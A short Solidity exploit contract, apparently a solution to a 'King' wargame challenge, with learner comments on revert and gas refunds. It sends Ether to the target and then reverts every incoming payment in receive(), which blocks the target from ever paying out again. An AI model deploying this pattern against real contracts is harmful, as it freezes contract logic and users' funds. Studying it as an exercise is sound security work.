// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

// revert will undo state changes and refund gas
// require will refund gas
// assert will not refund gas

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        // triggers a revert. Optionally, I could've also ommitted a payable function to begin with
        require(1 == 0, "I hacked you");
    }

    function hackContract() external {
        payable(contractAddress).call{value: address(this).balance}("");
    }
}
